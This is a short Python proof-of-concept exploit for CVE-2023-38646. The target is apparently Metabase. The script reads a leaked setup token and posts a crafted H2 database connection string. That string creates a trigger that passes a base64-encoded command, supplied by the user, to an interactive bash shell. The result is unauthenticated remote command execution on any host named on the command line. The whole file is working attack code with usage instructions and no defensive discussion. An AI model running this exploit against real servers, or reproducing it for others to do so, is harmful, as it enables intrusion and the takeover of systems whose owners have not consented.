# PoC for CVE-2023-38646
# (PoC) Author: github.com/traumatism

import requests
import base64
import sys

HTTPS = False


def exploit(host: str, cmd: str):
    first = requests.get(
        "http%s://%s/api/session/properties" % ("s" if HTTPS else "", host),
        verify=False,
    )

    first_json = first.json()

    try:
        setup_token = first_json["setup-token"]
    except:
        print("[-] Server have been already setup!")
        exit()

    print("[+] Setup token: %s" % setup_token)

    response = requests.post(
        "http%s://%s/api/setup/validate" % ("s" if HTTPS else "", host),
        verify=False,
        json={
            "token": setup_token,
            "details": {
                "is_on_demand": False,
                "is_full_sync": False,
                "is_sample": False,
                "cache_ttl": None,
                "refingerprint": False,
                "auto_run_queries": True,
                "schedules": {},
                "details": {
                    "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,%s}|{base64,-d}|{bash,-i}')\n$$--=x"
                    % cmd,
                    "advanced-options": False,
                    "ssl": True,
                },
                "name": "an-sec-research-team",
                "engine": "h2",
            },
        },
    )

    print("[+] Server response: %s" % response.text)


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("[-] Usage: exploit <host[:port]> <cmd>")
        exit()

    host = sys.argv[1]
    cmd = sys.argv[2]

    encoded_cmd = base64.b64encode(cmd.encode()).decode()

    if "=" in encoded_cmd:
        print("[-] Try another cmd (TODO: fix this, should be ez)")
        exit()

    exploit(host, encoded_cmd)
